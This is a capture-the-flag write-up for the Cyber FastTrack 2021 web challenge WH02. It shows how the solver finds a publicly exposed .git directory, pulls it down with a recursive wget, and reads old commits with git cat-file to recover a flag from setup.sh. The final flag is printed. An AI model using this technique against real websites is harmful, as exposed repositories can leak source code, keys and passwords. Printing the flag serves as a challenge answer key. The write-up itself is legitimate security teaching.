# Cyber FastTrack Spring 2021

### Solver: Will Green ([Ducky](https://github.com/wlg0005))
### Challenge: WH02 
### Category: Web (Hard)

## Description:
#### [500 pts]: Access the site at [https://cfta-wh02.allyourbases.co](https://cfta-wh02.allyourbases.co) and find a way to get the flag.

## Walkthrough:
Navigating to the provided URL, we're presented the following page:

![](WH02%20Writeup.001.png)

During the competition the "Use version control!" bullet caught my eye and made me immediately think of a misconfiguration in which websites leave their `.git` directory publicly accesible. Since Git is a widely used version control system for all kinds of software projects this means an attacker could potentially obtain information that they otherwise wouldn't be able to find such as keys or passwords.

If for some reason, I did not think of this at the time, I could've found the directory using a tool such as [Dirsearch](https://github.com/maurosoria/dirsearch).

Let's try navigating to `/.git`:

![](WH02%20Writeup.002.png)

Sure enough! Let's use `wget` to recursively download all of the files:

`wget -r https://cfta-wh02.allyourbases.co/.git/`

Now that we have the `.git` directory, we can open it up in a Git client such as Github Desktop and look at the commit history. Doing so, we find the file `setup.sh` that was committed on Mar 7, 2021, which contains the flag:

![](WH02%20Writeup.003.png)

As a side note, you could also find the flag by using the following syntax `git cat-file -p [object]`. So, you could print the master object found in `.git/refs/heads/master`, then the parent object, then the tree, and finally the `setup.sh` object:

```bash
.../.git/refs/heads$ git cat-file -p master

tree 7b45022b9625c4ff304c7889aa347c14a783d526
parent 80e789704ddca67d772dbc34de1088e8c1917e9d
author Joe Bloggs <j.bloggs@allyourbases.io> 1615149654 -0800
committer Joe Bloggs <j.bloggs@allyourbases.io> 1615149654 -0800

Production version.

.../.git/refs/heads$ git cat-file -p 80e789704ddca67d772dbc34de1088e8c1917e9d

tree 41d13ed4347b3165f04206816551c2db2e85362f
author Joe Bloggs <j.bloggs@allyourbases.io> 1615149294 -0800
committer Joe Bloggs <j.bloggs@allyourbases.io> 1615149294 -0800

Testing a few things.

.../.git/refs/heads$ git cat-file -p 41d13ed4347b3165f04206816551c2db2e85362f
100644 blob 29a14289852c096391cf9d2cd3de8907056b35f3    index.html
100644 blob dc5e9b1b5e6133b2c1d537010f9ea24285dbd961    setup.sh

.../.git/refs/heads$ git cat-file -p dc5e9b1b5e6133b2c1d537010f9ea24285dbd961
#!/bin/bash

FLAG="giTisAGreat_ResoURCe8337"

cd build
cp ../sitedata.zip sitedata.zip
unzip sitedata.zip
```

### Flag: giTisAGreat_ResoURCe8337
